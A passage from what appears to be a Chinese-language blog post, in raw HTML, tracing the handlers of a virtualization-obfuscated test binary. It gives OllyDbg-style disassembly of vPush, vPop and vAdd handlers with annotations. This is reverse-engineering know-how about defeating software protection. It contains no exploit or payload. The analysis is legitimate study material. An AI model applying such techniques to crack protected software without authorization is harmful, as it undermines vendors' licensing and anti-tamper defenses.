  03C2             add eax,edx\t\t\t\t\t\t\t\t;相加</span><br><span class=\"line\">004616E0    8946 04          mov dword ptr ds:[esi+0x4],eax\t\t\t\t;将结果压入原始esp+4</span><br><span class=\"line\">004616E6    9C               pushfd\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">004616E8    8F06             pop dword ptr ds:[esi]              \t\t;然后将efl写入到原始esp                         </span><br><span class=\"line\">004616F1    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00428439    81C7 04000000    add edi,0x4</span><br><span class=\"line\">00428446    33CB             xor ecx,ebx                                                 </span><br><span class=\"line\">00428448    C1C9 03          ror ecx,0x3</span><br><span class=\"line\">004810BD    F7D1             not ecx</span><br><span class=\"line\">004810BF    8D89 C448053F    lea ecx,dword ptr ds:[ecx+0x3F0548C4]</span><br><span class=\"line\">004810C5    81F1 2A55B526    xor ecx,0x26B5552A</span><br><span class=\"line\">004810D0    8D89 7AB5F99B    lea ecx,dword ptr ds:[ecx-0x64064A86]</span><br><span class=\"line\">004810D6    33D9             xor ebx,ecx</span><br><span class=\"line\">004810E0    03E9             add ebp,ecx</span><br><span class=\"line\">0040F74A   /FFE5             jmp ebp   ;0x0043BD4C  </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>把保存的EFL弹到R7</p>\n</blockquote>\n<h3 id=\"vPop-r7\"><a href=\"#vPop-r7\" class=\"headerlink\" title=\"vPop r7\"></a>vPop r7</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0043BD4C    8B0E             mov ecx,dword ptr ds:[esi]\t\t\t\t;从v_stack栈顶取出保存的efl</span><br><span class=\"line\">0043BD5B    0FB607           movzx eax,byte ptr ds:[edi]\t\t\t;读取一字节的opcode</span><br><span class=\"line\">0043BD66    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0043BD72    32C3             xor al,bl</span><br><span class=\"line\">0043BD74    04 95            add al,0x95</span><br><span class=\"line\">0043BD7A    F6D8             neg al</span><br><span class=\"line\">00479730    FEC0             inc al</span><br><span class=\"line\">00424206    34 28            xor al,0x28</span><br><span class=\"line\">00424208    32D8             xor bl,al                                           </span><br><span class=\"line\">0042420C    890C04           mov dword ptr ss:[esp+eax],ecx\t\t\t;push ecx</span><br><span class=\"line\">0042420F    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00424211    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00424217    33CB             xor ecx,ebx</span><br><span class=\"line\">0043796F    C1C9 02          ror ecx,0x2</span><br><span class=\"line\">0041F44A    81F1 7E7F9C09    xor ecx,0x99C7F7E</span><br><span class=\"line\">004104C7    49               dec ecx</span><br><span class=\"line\">004104C8    81F1 F25E4677    xor ecx,0x77465EF2</span><br><span class=\"line\">004104CE    8D89 1A29644A    lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">004104D5    33D9             xor ebx,ecx</span><br><span class=\"line\">004104D7    03E9             add ebp,ecx</span><br><span class=\"line\">004536AD    55               push ebp                                                    </span><br><span class=\"line\">004536AE    C3               retn\t;0x0045E179</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r4-1\"><a href=\"#vPop-r4-1\" class=\"headerlink\" title=\"vPop r4\"></a>vPop r4</h3><blockquote>\n<p>把上面vAdd的结果弹到R4</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0045E179    8B0E             mov ecx,dword ptr ds:[esi]\t\t\t\t;从v_stack栈顶取出保存的efl</span><br><span class=\"line\">0045E181    8DB6 04000000    lea esi,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">0045E187    0FB607           movzx eax,byte ptr ds:[edi]\t\t\t;读取一字节的opcode</span><br><span class=\"line\">0045E18A    81C7 01000000    add edi,0x1</span><br><span class=\"line\">0045E193    32C3             xor al,bl</span><br><span class=\"line\">0045E197    04 95            add al,0x95</span><br><span class=\"line\">0045E199    F6D8             neg al</span><br><span class=\"line\">0047C824    FEC0             inc al</span><br><span class=\"line\">00459FC2    34 28            xor al,0x28</span><br><span class=\"line\">00459FC8    32D8             xor bl,al</span><br><span class=\"line\">00459FCC    890C04           mov dword ptr ss:[esp+eax],ecx\t\t\t;pop</span><br><span class=\"line\">00459FCF    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00459FD1    81C7 04000000    add edi,0x4</span><br><span class=\"line\">00459FD7    33CB             xor ecx,ebx</span><br><span class=\"line\">00459FD9    C1C9 02          ror ecx,0x2</span><br><span class=\"line\">00459FDC    81F1 7E7F9C09    xor ecx,0x99C7F7E</span><br><span class=\"line\">00459FE2    49               dec ecx</span><br><span class=\"line\">00459FE3    81F1 F25E4677    xor ecx,0x77465EF2</span><br><span class=\"line\">00459FEE    81C1 1A29644A    add ecx,0x4A64291A</span><br><span class=\"line\">00459FF4    33D9             xor ebx,ecx</span><br><span class=\"line\">00459FF6    03E9             add ebp,ecx</span><br><span class=\"line\">00479CA7  ^\\FFE5             jmp ebp        \t;0x0040EB2E </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-r4\"><a href=\"#vPush-r4\" class=\"headerlink\" title=\"vPush r4\"></a>vPush r4</h3><blockquote>\n<p>R4入栈</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0040EB2E    0FB60F           movzx ecx,byte ptr ds:[edi]\t\t;读取一字节的opcode</span><br><span class=\"line\">0040EB37    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0040EB40    32CB             xor cl,bl</span><br><span class=\"line\">0040EB4F    F6D9             neg cl</span><br><span class=\"line\">0040EB51    80F1 0E          xor cl,0xE</span><br><span class=\"line\">0040EB5B    80E9 21          sub cl,0x21</span><br><span class=\"line\">0040EB68    F6D9             neg cl</span><br><span class=\"line\">0040EB6E    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">0040EB76    32D9             xor bl,cl</span><br><span class=\"line\">00440ED1    8B140C           mov edx,dword ptr ss:[esp+ecx]\t\t;</span><br><span class=\"line\">00440ED8    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">00440EDE    8916             mov dword ptr ds:[esi],edx\t\t\t;</span><br><span class=\"line\">00440EE0    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0041D911    81C7 04000000    add edi,0x4                                           </span><br><span class=\"line\">0041D91A    33CB             xor ecx,ebx                                                  </span><br><span class=\"line\">0042EDBF    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">0042AD19    D1C9             ror ecx,1</span><br><span class=\"line\">0042AD1B    49               dec ecx</span><br><span class=\"line\">0042AD1C    F7D1             not ecx</span><br><span class=\"line\">0042AD1E    33D9             xor ebx,ecx</span><br><span class=\"line\">004526DB    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                      </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                                 </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]                                                 ; test1_vm.00412728</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                  ; test1_vm.0043D124</span><br><span class=\"line\">00458194    5F               pop edi                                                       </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x004184B3</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-R0-0x0019FF2C\"><a href=\"#vPush-R0-0x0019FF2C\" class=\"headerlink\" title=\"vPush R0(0x0019FF2C)\"></a>vPush R0(0x0019FF2C)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004184B3    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">004184C1    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">004184C7    32CB             xor cl,bl</span><br><span class=\"line\">004184CB    F6D9             neg cl</span><br><span class=\"line\">004184D4    80F1 0E          xor cl,0xE</span><br><span class=\"line\">004184DC    80E9 21          sub cl,0x21</span><br><span class=\"line\">004184DF    F6D9             neg cl</span><br><span class=\"line\">004184E1    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">004184E6    32D9             xor bl,cl</span><br><span class=\"line\">004184E8    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">004184F0    8DB6 FCFFFFFF    lea esi,dword ptr ds:[esi-0x4]</span><br><span class=\"line\">00418501    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">00418503    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0041850A    81C7 04000000    add edi,0x4</span><br><span class=\"line\">00418510    33CB             xor ecx,ebx                                                 </span><br><span class=\"line\">00418516    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">004402C4    D1C9             ror ecx,1</span><br><span class=\"line\">004178C0    49               dec ecx</span><br><span class=\"line\">0044E1FF    F7D1             not ecx</span><br><span class=\"line\">0044E204    33D9             xor ebx,ecx</span><br><span class=\"line\">0044E20A    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                     </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                              </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]                                               </span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                     </span><br><span class=\"line\">00458194    5F               pop edi                                                     </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x004394F5</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-4-0xFFFFFFFC-2\"><a href=\"#vPush-4-0xFFFFFFFC-2\" class=\"headerlink\" title=\"vPush -4(0xFFFFFFFC)\"></a>vPush -4(0xFFFFFFFC)</h3><blockquote>\n<p>变量a地址相对于ebp的相对偏移</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004394F5    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">004394F7    81C7 04000000    add edi,0x4</span><br><span class=\"line\">00439503    33CB             xor ecx,ebx                                                 </span><br><span class=\"line\">0043B90E    41               inc ecx</span><br><span class=\"line\">0043B912    F7D9             neg ecx</span><br><span class=\"line\">00446A07    41               inc ecx</span><br><span class=\"line\">00446A11    81F1 66772375    xor ecx,0x75237766</span><br><span class=\"line\">00446A1B    33D9             xor ebx,ecx</span><br><span class=\"line\">00446A21    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">00446A30    890E             mov dword ptr ds:[esi],ecx</span><br><span class=\"line\">00446A38    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00446A40    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0043C79B    33CB             xor ecx,ebx                                                  </span><br><span class=\"line\">0045F6AB    F7D9             neg ecx</span><br><span class=\"line\">0045F6AE    8D89 6233DE7C    lea ecx,dword ptr ds:[ecx+0x7CDE3362]</span><br><span class=\"line\">004538B9    F7D9             neg ecx</span><br><span class=\"line\">004538BB    F7D1             not ecx</span><br><span class=\"line\">004538BD    33D9             xor ebx,ecx</span><br><span class=\"line\">004538C4    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                      </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                               </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]                                              </span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                              </span><br><span class=\"line\">00458194    5F               pop edi                                                      </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0046389F</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov\teax,dword ptr ds:[v_esp]\t;变量a地址相对于ebp的相对偏移</span><br><span class=\"line\">mov\tedx,dword ptr ds:[v_esp+0x4]</span><br><span class=\"line\">add \teax,edx</span><br><span class=\"line\">mov \tdword ptr ds:[v_esp+0x4],eax</span><br><span class=\"line\">mov \tdword ptr ds:[v_esp],efl</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"计算变量a的地址-ebp-4-2\"><a href=\"#计算变量a的地址-ebp-4-2\" class=\"headerlink\" title=\"计算变量a的地址,ebp-4\"></a>计算变量a的地址,ebp-4</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0046389F    8B06             mov eax,dword ptr ds:[esi]</span><br><span class=\"line\">004638A4    8B56 04          mov edx,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">004638AE    03C2             add eax,edx</span><br><span class=\"line\">004638B0    8946 04          mov dword ptr ds:[esi+0x4],eax</span><br><span class=\"line\">004638B3    9C               pushfd</span><br><span class=\"line\">004638B9    8F06             pop dword ptr ds:[esi]                                       </span><br><span class=\"line\">004638BB    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">004638BD    81C7 04000000    add edi,0x4</span><br><span class=\"line\">004638CA    33CB             xor ecx,ebx</span><br><span class=\"line\">004638CE    C1C9 03          ror ecx,0x3</span><br><span class=\"line\">004638D8    F7D1             not ecx</span><br><span class=\"line\">004638E1    8D89 C448053F    lea ecx,dword ptr ds:[ecx+0x3F0548C4]</span><br><span class=\"line\">004638E9    81F1 2A55B526    xor ecx,0x26B5552A</span><br><span class=\"line\">004638EF    8D89 7AB5F99B    lea ecx,dword ptr ds:[ecx-0x64064A86]</span><br><span class=\"line\">004638F5    33D9             xor ebx,ecx</span><br><span class=\"line\">004638F8    03E9             add ebp,ecx</span><br><span class=\"line\">0045D98A    55               push ebp                                                    </span><br><span class=\"line\">0045D98B    C3               retn\t\t;0x0046D3FB</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r12-2\"><a href=\"#vPop-r12-2\" class=\"headerlink\" title=\"vPop r12\"></a>vPop r12</h3><blockquote>\n<p>将EFL弹出堆栈</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0046D3FB    8B0E             mov ecx,dword ptr ds:[esi]</span><br><span class=\"line\">0046D3FD    81C6 04000000    add esi,0x4</span><br><span class=\"line\">0046D403    0FB607           movzx eax,byte ptr ds:[edi]</span><br><span class=\"line\">0046D407    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0046D413    32C3             xor al,bl</span><br><span class=\"line\">0046D415    04 95            add al,0x95</span><br><span class=\"line\">0046D41B    F6D8             neg al</span><br><span class=\"line\">004264F7    FEC0             inc al</span><br><span class=\"line\">004264F9    34 28            xor al,0x28</span><br><span class=\"line\">004264FC    32D8             xor bl,al</span><br><span class=\"line\">00426500    890C04           mov dword ptr ss:[esp+eax],ecx</span><br><span class=\"line\">00426503    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00426508    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0042650F    33CB             xor ecx,ebx</span><br><span class=\"line\">00426512    C1C9 02          ror ecx,0x2</span><br><span class=\"line\">0047CDC0    81F1 7E7F9C09    xor ecx,0x99C7F7E</span><br><span class=\"line\">00483DE1    49               dec ecx</span><br><span class=\"line\">00483DE8    81F1 F25E4677    xor ecx,0x77465EF2</span><br><span class=\"line\">00483DF9    8D89 1A29644A    lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">00483E02    33D9             xor ebx,ecx</span><br><span class=\"line\">00483E0B    03E9             add ebp,ecx</span><br><span class=\"line\">0047FFF9  ^\\FFE5             jmp ebp        ;0x00452B62  </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov \teax,dword ptr ds:[v_esp]\t;变量a地址</span><br><span class=\"line\">mov\tedx,dword ptr ds:[v_esp+0x4]\t;之前vPush进来的eax</span><br><span class=\"line\">mov\tdword ptr ds:[eax],edx\t;mov         dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"把计算的结果存回变量a\"><a href=\"#把计算的结果存回变量a\" class=\"headerlink\" title=\"把计算的结果存回变量a\"></a>把计算的结果存回变量a</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00452B62    8B06             mov eax,dword ptr ds:[esi]\t\t\t\t;变量a的地址</span><br><span class=\"line\">00452B6B    8B56 04          mov edx,dword ptr ds:[esi+0x4]\t\t\t;a的值</span><br><span class=\"line\">00452B71    8DB6 08000000    lea esi,dword ptr ds:[esi+0x8]</span><br><span class=\"line\">00452B7E    36:8910          mov dword ptr ss:[eax],edx</span><br><span class=\"line\">00452B88    8B07             mov eax,dword ptr ds:[edi]</span><br><span class=\"line\">00452B8D    81C7 04000000    add edi,0x4</span><br><span class=\"line\">00452B96    33C3             xor eax,ebx                                                  </span><br><span class=\"line\">00452B9C    F7D0             not eax</span><br><span class=\"line\">00452BA3    8D80 39CAABFE    lea eax,dword ptr ds:[eax-0x15435C7]</span><br><span class=\"line\">00452BA9    35 CE111A71      xor eax,0x711A11CE</span><br><span class=\"line\">00452BB3    8D80 03AE9DB8    lea eax,dword ptr ds:[eax-0x476251FD]</span><br><span class=\"line\">00452BB9    33D8             xor ebx,eax</span><br><span class=\"line\">00452BBC    03E8             add ebp,eax</span><br><span class=\"line\">0040AABF    55               push ebp                                                     </span><br><span class=\"line\">0040AAC0    C3               retn\t;0x004494C2</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-R0-0x0019FF2C-1\"><a href=\"#vPush-R0-0x0019FF2C-1\" class=\"headerlink\" title=\"vPush R0(0x0019FF2C)\"></a>vPush R0(0x0019FF2C)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004494C2    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">004494CC    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">004494DA    32CB             xor cl,bl</span><br><span class=\"line\">004494DC    F6D9             neg cl</span><br><span class=\"line\">004494DF    80F1 0E          xor cl,0xE</span><br><span class=\"line\">004494E8    80E9 21          sub cl,0x21</span><br><span class=\"line\">004494EB    F6D9             neg cl</span><br><span class=\"line\">004494F4    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">004494FD    32D9             xor bl,cl</span><br><span class=\"line\">00449503    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">0044950A    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">00449511    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">00449516    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00449518    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0042DC24    33CB             xor ecx,ebx</span><br><span class=\"line\">0042DC27    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">0042DC30    D1C9             ror ecx,1</span><br><span class=\"line\">0043242E    49               dec ecx</span><br><span class=\"line\">00432430    F7D1             not ecx</span><br><span class=\"line\">00432433    33D9             xor ebx,ecx</span><br><span class=\"line\">00432436    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                      </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                                                                              </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                      </span><br><span class=\"line\">00458194    5F               pop edi                                                     </span><br><span class=\"line\">0044BD0C    55               push ebp                                                     </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0044A08D</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-4-0xFFFFFFFC-3\"><a href=\"#vPush-4-0xFFFFFFFC-3\" class=\"headerlink\" title=\"vPush -4(0xFFFFFFFC)\"></a>vPush -4(0xFFFFFFFC)</h3><blockquote>\n<p>变量a地址相对于ebp的相对偏移</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0044A08D    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0044A08F    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0041917F    33CB             xor ecx,ebx</span><br><span class=\"line\">00477182    41               inc ecx</span><br><span class=\"line\">0041182A    F7D9             neg ecx</span><br><span class=\"line\">0041996A    41               inc ecx</span><br><span class=\"line\">0041996B    81F1 66772375    xor ecx,0x75237766</span><br><span class=\"line\">00419972    33D9             xor ebx,ecx</span><br><span class=\"line\">00419979    8DB6 FCFFFFFF    lea esi,dword ptr ds:[esi-0x4]</span><br><span class=\"line\">0041997F    890E             mov dword ptr ds:[esi],ecx</span><br><span class=\"line\">00419981    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00419987    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0044414F    33CB             xor ecx,ebx</span><br><span class=\"line\">00444154    F7D9             neg ecx</span><br><span class=\"line\">00444159    8D89 6233DE7C    lea ecx,dword ptr ds:[ecx+0x7CDE3362]</span><br><span class=\"line\">004774CA    F7D9             neg ecx</span><br><span class=\"line\">004774CD    F7D1             not ecx</span><br><span class=\"line\">004774D0    33D9             xor ebx,ecx</span><br><span class=\"line\">004774D3    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                  </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                        </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                     ; test1_vm.0043D148</span><br><span class=\"line\">00458194    5F               pop edi                                                      </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0042A0F0</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov\teax,dword ptr ds:[v_esp]\t;变量a地址相对于ebp的相对偏移</span><br><span class=\"line\">mov\tedx,dword ptr ds:[v_esp+0x4]</span><br><span class=\"line\">add \teax,edx</span><br><span class=\"line\">mov \tdword ptr ds:[v_esp+0x4],eax</span><br><span class=\"line\">mov \tdword ptr ds:[v_esp],efl</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"计算变量a的地址-ebp-4-3\"><a href=\"#计算变量a的地址-ebp-4-3\" class=\"headerlink\" title=\"计算变量a的地址,ebp-4\"></a>计算变量a的地址,ebp-4</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0042A0F0    8B06             mov eax,dword ptr ds:[esi]</span><br><span class=\"line\">0042A0FD    8B56 04          mov edx,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">0042A105    03C2             add eax,edx</span><br><span class=\"line\">0042A107    8946 04          mov dword ptr ds:[esi+0x4],eax</span><br><span class=\"line\">0042A10D    9C               pushfd</span><br><span class=\"line\">0042A112    8F06             pop dword ptr ds:[esi]                                      </span><br><span class=\"line\">0042A11B    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0042A11D    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0042A129    33CB             xor ecx,ebx</span><br><span class=\"line\">004670D9    C1C9 03          ror ecx,0x3</span><br><span class=\"line\">0041C461    F7D1             not ecx</span><br><span class=\"line\">0041C468    8D89 C448053F    lea ecx,dword ptr ds:[ecx+0x3F0548C4]</span><br><span class=\"line\">0041C46E    81F1 2A55B526    xor ecx,0x26B5552A</span><br><span class=\"line\">0041C474    81E9 864A0664    sub ecx,0x64064A86</span><br><span class=\"line\">0041C482    33D9             xor ebx,ecx</span><br><span class=\"line\">0044C712    03E9             add ebp,ecx</span><br><span class=\"line\">0045ACDE    55               push ebp                                                    </span><br><span class=\"line\">0045ACDF    C3               retn\t\t\t\t;0x0046C4CB</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r15-2\"><a href=\"#vPop-r15-2\" class=\"headerlink\" title=\"vPop r15\"></a>vPop r15</h3><blockquote>\n<p>将EFL弹出</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0046C4CB    8B0E             mov ecx,dword ptr ds:[esi]</span><br><span class=\"line\">0046C4CD    8DB6 04000000    lea esi,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">0046C4D7    0FB607           movzx eax,byte ptr ds:[edi]</span><br><span class=\"line\">0046C4E3    32C3             xor al,bl</span><br><span class=\"line\">0046C4EA    04 95            add al,0x95</span><br><span class=\"line\">00445326    F6D8             neg al</span><br><span class=\"line\">00445328    FEC0             inc al</span><br><span class=\"line\">0044532B    34 28            xor al,0x28</span><br><span class=\"line\">00445332    32D8             xor bl,al</span><br><span class=\"line\">00445334    890C04           mov dword ptr ss:[esp+eax],ecx</span><br><span class=\"line\">0044533F    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00445346    81C7 04000000    add edi,0x4</span><br><span 